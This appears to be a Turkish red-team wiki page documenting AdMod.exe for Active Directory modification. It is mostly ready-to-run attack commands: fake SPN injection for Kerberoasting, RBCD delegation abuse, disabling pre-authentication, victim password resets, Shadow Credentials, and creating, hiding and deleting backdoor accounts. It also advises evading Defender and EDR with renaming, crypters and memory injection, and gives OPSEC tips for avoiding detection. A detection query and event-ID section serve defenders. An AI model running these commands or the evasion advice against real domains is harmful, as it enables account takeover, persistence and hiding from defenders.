# AdMod.exe

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Joe Richards (joeware.net) tarafından C++ ile yazılmış; PowerShell veya RSAT bağımlılığı olmadan, Win32 Native LDAP API üzerinden Active Directory nesnelerini ve özniteliklerini değiştiren, ekleyen, silen ve yetki/kalıcılık enjekte eden güçlü komut satırı aracı.

---

## 1. Genel Bakış ve Amaç

**AdMod.exe**, Active Directory nesneleri ve öznitelikleri (attributes) üzerinde değişiklik (modify), ekleme (add), silme (delete) ve yeniden adlandırma (rename/move) işlemlerini otomatize etmek için geliştirilmiş hafif ve yerel bir C++ CLI aracıdır. Kardeş aracı olan `AdFind.exe` dizin üzerinde salt okunur (read-only) arama yaparken; `AdMod.exe`, sızma testi uzmanları ve kırmızı takım operatörleri tarafından **sömürü (exploitation), ayrıcalık yükseltme (privilege escalation) ve kalıcılık (persistence)** adımlarında dizin manipülasyonu yapmak için kullanılır.

AdMod'un en kritik mimari yeteneklerinden biri, `AdFind` ile doğrudan komut satırı boru hattı (piping) üzerinden entegre olabilmesidir. Operatör, `adfind.exe` ile süzdüğü hedef nesneleri boru hattı üzerinden doğrudan `admod.exe` ikilisine aktararak toplu öznitelik enjeksiyonu gerçekleştirebilir. Bu sayede PowerShell çalıştırmadan ve .NET CLR izi bırakmadan Kerberos SPN enjeksiyonu, Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) yapılandırması veya DONT_REQ_PREAUTH bayrağı eklemesi yapılabilir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              ADMOD.EXE ÇALIŞMA MİMARİSİ                          |
+-----------------------------------------------------------------------------------+
                                          |
        [AdFind.exe Sorgusu]  ---> (Boru Hattı | ) ---> [AdMod.exe Komutu]
        veya Doğrudan Komut Satırı: admod.exe -b <HedefDN> <Öznitelik:Operatör:Değer>
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Win32 Native LDAP Arayüzü                                  |
|        (wldap32.dll - ldap_modify_s, ldap_add_s, ldap_delete_s Fonksiyonları)     |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Kimlik Doğrulama Mekanizması                               |
|        - Geçerli İşlem Oturumu (Kerberos / SSPI Token)                            |
|        - Parametre ile Açık Kimlik Doğrulama (-u user -up pass)                   |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        LDAP / LDAPS İletişimi (TCP 389 / 636)                     |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                              Hedef Etki Alanı Denetleyicisi                        |
|        Active Directory Veritabanı (NTDS.dit Değişikliği & Replikasyon)           |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                     Saldırı ve Kalıcılık Çıktıları (Operations)                   |
|  - SPN Enjeksiyonu (Hedefli Kerberoasting)                                       |
|  - RBCD Güvenlik Tanımlayıcısı Enjeksiyonu                                        |
|  - Shadow Credentials (msDS-KeyCredentialLink)                                    |
|  - Parola Sıfırlama (unicodePwd) ve Pre-Auth Manipülasyonu                        |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Kırmızı Takım / Saldırı Senaryosu |
|---|---|---|
| **SPN Enjeksiyonu (Kalıcılık)** | Normal bir kullanıcıya sahte `servicePrincipalName` ekler. | Kullanıcıyı Kerberoastable hale getirip çevrimdışı TGS kırma olanağı yaratma. |
| **RBCD Manipülasyonu** | Bilgisayar nesnesinin `msDS-AllowedToActOnBehalf...` alanını yazar. | Hedef bilgisayarda S4U2Proxy ile Local Administrator / SYSTEM yetkisi alma. |
| **Boru Hattı Entegrasyonu** | `AdFind -f ... | AdMod ...` şeklinde kitlesel güncelleme yapar. | Tek komutla yüzlerce nesneye arka kapı veya kural enjekte etme. |
| **PowerShell Korumalarını Aşma**| PowerShell CLM veya AppLocker engellerine takılmaz. | Kısıtlı Windows sistemlerinde güvenle LDAP yazma operasyonları icra etme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | AdMod.exe | Set-ADObject / User | PowerView (Set-DomainObject) | ldapmodify | BloodyAD |
|---|---|---|---|---|---|
| **Platform** | Windows (C++) | Windows (PS/RSAT) | Windows (PowerShell) | Linux (C / OpenLDAP) | Linux/Win (Python) |
| **RSAT Bağımlılığı** | **Yok** | **Var (RSAT)** | Yok | Yok | Yok |
| **AMSI / Script Log** | **Üretmez** | Üretir (4104) | Üretir (4104) | Üretmez | Üretmez |
| **Piping (Boru Hattı)** | AdFind ile Tam Uyum | PS Pipeline | PS Pipeline | LDIF Dosyası | Yok |
| **Boyut / Taşınabilirlik**| ~300 KB Tek Binary | Büyük Modül | Betik Dosyası | Paket Gerekir | Python / Binary |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

AdMod'un genel komut satırı sözdizimi:

```cmd
AdMod.exe [-b HedefDN] [Öznitelik Operatörleri] [Seçenekler]
```

### 2.1 Öznitelik Değiştirme Operatörleri

AdMod'da öznitelik manipülasyonu özel sözdizimi kurallarına dayanır:

| Operatör Sözdizimi | Açıklama | Örnek |
|---|---|---|
| `attribute:değer` | Özniteliğin mevcut değerini silip yerine yeni değeri yazar. | `description:"Sistem Yoneticisi"` |
| `attribute:+:değer` | Çok değerli (multi-valued) özniteliğe yeni bir değer ekler (Append). | `servicePrincipalName:+:HTTP/fake.corp.local` |
| `attribute:-:değer` | Çok değerli öznitelikten yalnızca belirtilen değeri çıkarır (Remove).| `servicePrincipalName:-:HTTP/fake.corp.local` |
| `attribute:--` | İlgili özniteliğin tüm içeriğini tamamen temizler (Clear). | `description:--` |

### 2.2 Temel Komut Satırı Bayrakları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-b` | Değiştirilecek hedef nesnenin tam Ayırt Edici Adı (Distinguished Name). | `-b "CN=jdoe,OU=Users,DC=corp,DC=local"` |
| `-h` | Hedef Etki Alanı Denetleyicisi IP'si veya FQDN'i. | `-h 10.10.10.10:389` |
| `-u` | Farklı bir kullanıcı yetkisiyle bağlanmak için kullanıcı adı. | `-u "corp\admin"` |
| `-up` | İlgili kullanıcının parolası. | `-up "P@ssw0rd2026!"` |
| `-add` | Dizin içerisinde tamamen yeni bir nesne oluşturur. | `-add` |
| `-del` | Belirtilen nesneyi etki alanından tamamen siler. | `-del` |
| `-rename` | Nesnenin RDN (Relative Distinguished Name) değerini değiştirir. | `-rename "CN=NewName"` |
| `-moveto` | Nesneyi başka bir Organizasyonel Birime (OU) taşır. | `-moveto "OU=Disabled,DC=corp,DC=local"` |
| `-unsafe` | AdMod güvenlik onaylarını atlayarak işlemi doğrudan icra eder. | `-unsafe` |
| `-exterr` | Hata durumunda Microsoft Extended Error (Genişletilmiş Hata) detayını gösterir. | `-exterr` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kullanıcıya Sahte SPN Enjekte Ederek Kerberoasting Kalıcılığı Sağlama

Düşük yetkili bir etki alanı kullanıcısına (veya ele geçirilen bir hesaba) `servicePrincipalName` ekleyerek hesabı Kerberoastable hale getirme:

```cmd
AdMod.exe -b "CN=yedek_kullanici,OU=Users,DC=corp,DC=local" "servicePrincipalName:+:MSSQLSvc/backup.corp.local:1433"
```

**Konsol Çıktısı Analizi:**

```text
AdMod V01.16.00cpp Joe Richards (joe@joeware.net) April 2023

DN -- CN=yedek_kullanici,OU=Users,DC=corp,DC=local
   Modifying specified attributes...
   Adding servicePrincipalName : MSSQLSvc/backup.corp.local:1433
   The command completed successfully.
```
*Analiz: `yedek_kullanici` nesnesine MSSQL SPN'i eklenmiştir. Operatör artık bu hesap için etki alanındaki herhangi bir makineden TGS bilet özeti isteyebilir ve çevrimdışı kırarak kalıcı erişim elde edebilir.*

### Senaryo 2: Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) ile Makine Ele Geçirme

Hedef bir sunucu üzerinde `GenericWrite` yetkisi elde edildiğinde, saldırganın kontrolündeki bir bilgisayar hesabını (`ATTACKERPC$`) hedef makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine güvenlik tanımlayıcısı olarak yazma:

```cmd
AdMod.exe -b "CN=FILESERVER01,OU=Servers,DC=corp,DC=local" "msDS-AllowedToActOnBehalfOfOtherIdentity:SDDL:O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-39281-1105)"
```

### Senaryo 3: AdFind ve AdMod Pipelining ile Toplu Hesap Güncelleme

AdFind ile belirli bir OU altındaki tüm kullanıcıları bulup, AdMod ile açıklamalarına tek bir hamlede not ekleme:

```cmd
AdFind.exe -b "OU=Muhasebe,DC=corp,DC=local" -f "(objectCategory=person)" -dsq | AdMod.exe "description:Denetlendi - 2026" -unsafe
```

### Senaryo 4: AS-REP Roasting için DONT_REQ_PREAUTH Bayrağını Açma

Hedef bir kullanıcının `userAccountControl` değerine `4194304` (DONT_REQ_PREAUTH) bitini ekleyerek parolası bilinmeden Kerberos bilet özeti alınabilir hale getirme:

```cmd
AdMod.exe -b "CN=kurban_hesap,OU=Users,DC=corp,DC=local" "userAccountControl:OR:4194304"
```

### Senaryo 5: Kullanıcı Parolasını Doğrudan LDAP Üzerinden Sıfırlama

Yönetici veya parola sıfırlama hakkı olan bir hesapla kurban kullanıcının parolasını şifreli LDAPS oturumu üzerinden değiştirme:

```cmd
AdMod.exe -h dc01.corp.local:636 -ssl -b "CN=da_mehmet,OU=Admins,DC=corp,DC=local" "unicodePwd:NewP@ssw0rd2026!"
```

### Senaryo 6: Nesneyi Başka Bir OU'ya Taşıma (Persistence Saklama)

Arka kapı olarak oluşturulan bir hesabı sistem yöneticilerinin gözünden kaçırmak için karmaşık veya derin bir OU'ya taşıma:

```cmd
AdMod.exe -b "CN=backdoor_user,CN=Users,DC=corp,DC=local" -moveto "OU=ServiceAccounts,OU=Legacy,DC=corp,DC=local"
```

### Senaryo 7: Kilitli Hesabın Kilidini Açma ve Hesabı Aktifleştirme

Parola püskürtme veya hatalı girişler nedeniyle kilitlenmiş bir hesabın kilidini açma ve devre dışıysa etkinleştirme:

```cmd
:: 1. Kilitlenme süresini sıfırlama (Lockout açma)
AdMod.exe -b "CN=hedef_kullanici,OU=Users,DC=corp,DC=local" "lockoutTime:0"

:: 2. Devre dışı hesabı etkinleştirme (ACCOUNTDISABLE bitini kaldırma)
AdMod.exe -b "CN=hedef_kullanici,OU=Users,DC=corp,DC=local" "userAccountControl:AND:NOT:2"
```

### Senaryo 8: Shadow Credentials (msDS-KeyCredentialLink) Enjeksiyonu

Hedef kullanıcı veya bilgisayar üzerinde `GenericWrite` yetkisi olduğunda, Whisper-PKI formatında oluşturulmuş ham KeyCredential ham binary verisini enjekte ederek PKINIT ile TGT talep etme:

```cmd
AdMod.exe -b "CN=TargetUser,OU=Users,DC=corp,DC=local" "msDS-KeyCredentialLink:+:B:256:7B34...RAW_HEX_KEY..."
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `AdMod: Error 0x32 (50) - Insufficient Rights` | İşlemi yapan kullanıcının hedef nesne veya öznitelik üzerinde `WriteProperty` / `GenericAll` izni yok. | Hedef nesne üzerindeki ACL haklarınızı `AdFind` veya `PowerView` ile kontrol edin. Yalnızca yazma izniniz olan nesneleri hedefleyin. |
| `AdMod: Error 0x13 (19) - Constraint Violation` | Yazılmak istenen öznitelik değeri Active Directory şema veya karmaşıklık kurallarına uymuyor (örneğin parola politikasına uymayan parola sıfırlama). | Parolanın etki alanı karmaşıklık kurallarına (büyük/küçük harf, rakam, özel karakter, uzunluk) uyduğundan emin olun. Komuta `-exterr` bayrağı ekleyerek ayrıntılı hata kodunu okuyun. |
| `AdMod: Error 0x44 (68) - Already Exists` | `attribute:+:değer` kullanılırken eklenmek istenen değer zaten nesnede mevcut (mükerrer SPN vb.). | Özniteliğin mevcut içeriğini `AdFind.exe -b <DN> <Öznitelik>` ile inceleyin. Gerekirse önce silip sonra yeniden ekleyin. |
| `AdMod: Error 0x51 (81) - Server Down` | DC LDAP portuna (389 veya 636) erişilemiyor. | `-h <DC_IP>` bayrağı ile geçerli DC adresini belirtin. LDAPS kullanıyorsanız sertifika ve FQDN eşleşmesini kontrol edin. |
| `Modifying unicodePwd requires an encrypted connection` | Parola sıfırlama (`unicodePwd`) işlemi düz metin port 389 üzerinden denenmeye çalışıldı. | Microsoft güvenlik standardı gereği parola değişiklikleri **yalnızca** şifreli bağlantıda yapılabilir. Komuta mutlaka `-h <FQDN>:636 -ssl` bayraklarını ekleyin. |
| `Defender / EDR: HackTool:Win32/AdMod detected` | Windows Defender veya EDR, AdMod'un bilinen PE hash imzasını yakaladı. | Dosya adını meşru bir Windows yönetim aracına benzetin (`dsmod_update.exe`), binary'yi crypter ile paketleyin veya unmanaged bellek enjeksiyonu kullanın. |
| `AdMod: Error 0x10 (16) - No Such Attribute` | Belirtilen öznitelik adı AD şemasında tanımlı değil veya yazım hatası yapıldı. | Öznitelik adını LDAP şemasından (örneğin `servicePrincipalName`) doğrulayın. Büyük/küçük harf duyarlılığına dikkat edin. |
| `Operation failed: referral was returned from server` | Hedef nesne mevcut DC'nin etki alanında değil, üst/alt orman etki alanında bulunuyor. | `-h` parametresine hedef nesnenin ait olduğu etki alanının DC adresini doğrudan verin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

AdFind sadece okuma yaparken, **AdMod doğrudan dizin üzerinde değişiklik yaptığı için Active Directory seviyesinde en yüksek seviyede log ve denetim izi üretir.**

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 5136 (A directory service object was modified):**
   - Active Directory Denetim Politikası aktifse, AdMod tarafından değiştirilen **her öznitelik için ayrı bir Event ID 5136** üretilir. Bu günlükte; işlemi yapan kullanıcı, hedef nesnenin DN'i, değiştirilen öznitelik adı (`servicePrincipalName`, `msDS-AllowedToActOnBehalf...`) ve en kritik olarak **Eski Değer (OldValue)** ile **Yeni Değer (NewValue)** açıkça kaydedilir!
2. **Windows Security Event ID 4738 (A user account was modified):**
   - Kullanıcı hesabı öznitelikleri (parola sıfırlama, UAC bayrağı, SPN vb.) değiştiğinde tetiklenir.
3. **Windows Security Event ID 4724 (An attempt was made to reset an account's password):**
   - `unicodePwd` özniteliği üzerinden parola sıfırlandığında üretilir.
4. **Sysmon Event ID 1 (Process Creation):**
   - Komut satırında `admod.exe` ve kullanılan argümanlar (`servicePrincipalName:+:`, `userAccountControl:OR:`) uç nokta tespit sistemleri tarafından kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Modify İstekleri:** `LDAPModifyRequest` paketleri DC tarafında kolayca filtrelenebilir.
- **Mükerrer SPN Tespiti:** Aynı SPN'in etki alanında iki farklı hesaba atanması durumunda KDC üzerinde Kerberos hata alarmları tetiklenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | AdMod Kullanımı |
|---|---|---|
| **T1098** | Account Manipulation | SPN enjeksiyonu, RBCD ekleme, pre-auth kapatma |
| **T1098.005** | Account Manipulation: Device Registration | `msDS-KeyCredentialLink` manipülasyonu |
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | Sahte SPN oluşturarak hedefli Kerberoasting |
| **T1136.002** | Create Account: Domain Account | `-add` bayrağı ile arka kapı kullanıcı hesabı açma |
| **T1070.004** | Indicator Removal: File Deletion | `-del` ile etki alanından nesne silme |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **Event ID 5136 Alarmı** | Hassas özniteliklerin (`msDS-AllowedTo...`, `servicePrincipalName`) değişmesi. | Değişiklik yapmadan önce SIEM denetim seviyesini kontrol edin; operasyon tamamlandığında eklenen özniteliği mutlaka `attribute:-:değer` ile geri silin. |
| **CLI Argüman İzleri** | `AdMod.exe` komut satırı argümanlarının EDR tarafından izlenmesi. | Komut satırı argümanlarını doğrudan CMD'den vermek yerine bir metin dosyasından veya stdin üzerinden borulayın. |
| **Düz Metin Parola Gönderimi** | Port 389 üzerinden açık metin öznitelik yazma. | Her zaman `-ssl` kullanarak trafiği şifreleyin ve ağ izleyicilerinden korunun. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

AdMod kaynaklı SPN ve RBCD manipülasyonlarını tespit eden örnek KQL / Event ID 5136 kuralı:

```kql
// Şüpheli SPN veya RBCD öznitelik değişikliklerinin tespiti
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName in~ ("servicePrincipalName", "msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-KeyCredentialLink")
| where OperationType == "%%14674" // Value Added
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Kullanıcıya Sahte SPN Ekleyerek Kerberoastable Yapma
AdMod.exe -b "CN=user,OU=Users,DC=corp,DC=local" "servicePrincipalName:+:HTTP/websvc.corp.local"
```
- **Ne Yapar?** Belirtilen kullanıcıya sahte bir SPN kaydı ekler.
- **Ne Zaman Kullanılır?** Parolasını kırmak istediğiniz veya kalıcılık hedeflediğiniz bir hesabı Kerberoastable yaparken.
- **Parametreler:** `attribute:+:value` mevcut değerleri koruyarak yeni değer ekler.

```cmd
# 2. Eklenen SPN Kaydını Geri Silme (Temizlik / Cleanup)
AdMod.exe -b "CN=user,OU=Users,DC=corp,DC=local" "servicePrincipalName:-:HTTP/websvc.corp.local"
```
- **Ne Yapar?** Önceden enjekte edilen sahte SPN kaydını kaldırır.
- **Ne Zaman Kullanılır?** Sızma testi veya kırmızı takım operasyonu bittiğinde IOC izlerini temizlerken.
- **Parametreler:** `attribute:-:value` ilgili değeri siler.

```cmd
# 3. RBCD Yetkisi Enjekte Etme (Kaynak Tabanlı Kısıtlı Delegasyon)
AdMod.exe -b "CN=TARGETPC,OU=Computers,DC=corp,DC=local" "msDS-AllowedToActOnBehalfOfOtherIdentity:SDDL:O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2559786414-2279769532-2164155192-1105)"
```
- **Ne Yapar?** Hedef bilgisayarın özniteliğine saldırgan bilgisayarının SID'sini yönetici olarak ekler.
- **Ne Zaman Kullanılır?** RBCD üzerinden hedef sistemde SYSTEM yetkisi elde ederken.
- **Parametreler:** `:SDDL:` formatında güvenlik tanımlayıcısı enjeksiyonu.

```cmd
# 4. AS-REP Roasting için Pre-Auth Bayrağını Açma
AdMod.exe -b "CN=target_user,OU=Users,DC=corp,DC=local" "userAccountControl:OR:4194304"
```
- **Ne Yapar?** Kullanıcının Kerberos ön kimlik doğrulama zorunluluğunu kaldırır.
- **Ne Zaman Kullanılır?** Kullanıcı parolasını bilmeden AS-REP hash'i yakalamak istendiğinde.
- **Parametreler:** `:OR:4194304` DONT_REQ_PREAUTH bitini UAC'ye ekler.

```cmd
# 5. Parola Sıfırlama (Şifreli LDAPS ile)
AdMod.exe -h dc01.corp.local:636 -ssl -b "CN=victim,OU=Users,DC=corp,DC=local" "unicodePwd:NewPassword2026!"
```
- **Ne Yapar?** Belirtilen kullanıcının etki alanı parolasını doğrudan sıfırlar.
- **Ne Zaman Kullanılır?** Parola sıfırlama hakkınız olan yetkili bir hesabı devralırken.
- **Parametreler:** `-ssl` TLS zorunluluğu; `unicodePwd` parola özniteliği.

```cmd
# 6. Nesne Açıklamasını (Description) Tamamen Temizleme
AdMod.exe -b "CN=user,OU=Users,DC=corp,DC=local" "description:--"
```
- **Ne Yapar?** İlgili özniteliğin tüm içeriğini boşaltır.
- **Ne Zaman Kullanılır?** Açıklama satırında bırakılan notları veya izleri temizlemek için.
- **Parametreler:** `:--` öznitelik temizleme operatörü.

```cmd
# 7. AdFind ile Bulunan Tüm Nesneleri Topluca Güncelleme
AdFind.exe -b "OU=Staging,DC=corp,DC=local" -f "(objectClass=user)" -dsq | AdMod.exe "department:Test" -unsafe
```
- **Ne Yapar?** AdFind ile listelenen tüm kullanıcıların departman bilgisini tek satırda günceller.
- **Ne Zaman Kullanılır?** Toplu dizin manipülasyonu ve otomasyon senaryolarında.
- **Parametreler:** `-dsq` AdMod uyumlu DN çıktısı; `-unsafe` onay istemeden yazar.

```cmd
# 8. Nesneyi Başka Bir OU'ya Taşıma
AdMod.exe -b "CN=bad_user,CN=Users,DC=corp,DC=local" -moveto "OU=Disabled,DC=corp,DC=local"
```
- **Ne Yapar?** Nesneyi mevcut konumundan hedef OU altına taşır.
- **Ne Zaman Kullanılır?** Arka kapı hesaplarını gizlemek veya organizasyonu değiştirmek için.
- **Parametreler:** `-moveto` hedef OU Distinguished Name.

```cmd
# 9. Dizin İçerisinde Yeni Kullanıcı Nesnesi Oluşturma
AdMod.exe -b "CN=svc_audit,OU=Users,DC=corp,DC=local" -add "objectClass:user" "sAMAccountName:svc_audit"
```
- **Ne Yapar?** Dizin ağacında doğrudan yeni bir kullanıcı nesnesi yaratır.
- **Ne Zaman Kullanılır?** Kalıcı servis hesabı oluştururken.
- **Parametreler:** `-add` nesne oluşturma modu; `objectClass` sınıf belirteci.

```cmd
# 10. Nesneyi Etki Alanından Tamamen Silme
AdMod.exe -b "CN=temp_backdoor,OU=Users,DC=corp,DC=local" -del -unsafe
```
- **Ne Yapar?** Belirtilen hedef nesneyi Active Directory veritabanından kalıcı olarak siler.
- **Ne Zaman Kullanılır?** Operasyon sonrası oluşturulan test hesaplarını yok ederken.
- **Parametreler:** `-del` silme anahtarı; `-unsafe` onay istemez.

---

## Kaynaklar

- **Resmi Joeware Sayfası:** [joeware.net / AdMod](https://www.joeware.net/freetools/tools/admod/)
- **Joeware AdMod Operatör Sözdizimi:** [AdMod Syntax Reference](https://www.joeware.net/freetools/tools/admod/usage.htm)
- **Active Directory msDS-AllowedToActOnBehalfOfOtherIdentity:** [Microsoft RBCD Reference](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1b1f9b1d-3b5f-4a37-9759-42b7d4d7ebba)
- **MITRE ATT&CK Framework:** [Technique T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)

---

> **Önceki:** [← AdFind.exe](./AdFind.md) · **Sonraki:** [adidnsdump →](./adidnsdump.md)
